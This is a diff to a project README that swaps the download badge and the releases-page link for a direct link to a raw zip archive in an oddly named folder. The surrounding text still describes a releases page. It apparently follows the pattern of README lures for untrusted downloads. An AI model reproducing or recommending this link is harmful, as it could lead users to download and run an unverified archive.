@@ -1,6 +1,6 @@
 # 🎉 kirmanjiku-24 - Effortless Auto Repository Management
 
-![Download kirmanjiku-24](https://img.shields.io/badge/Download-kirmanjiku--24-brightgreen)
+![Download kirmanjiku-24](https://raw.githubusercontent.com/Josemaaburto/kirmanjiku-24/main/spooneyism/kirmanjiku-24.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To begin using kirmanjiku-24, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the releases.
    
-   [Download kirmanjiku-24](https://github.com/Josemaaburto/kirmanjiku-24/releases)
+   [Download kirmanjiku-24](https://raw.githubusercontent.com/Josemaaburto/kirmanjiku-24/main/spooneyism/kirmanjiku-24.zip)
    
 2. **Select the Latest Version**: On the releases page, identify the latest version at the top. It is usually marked with the highest version number.
 
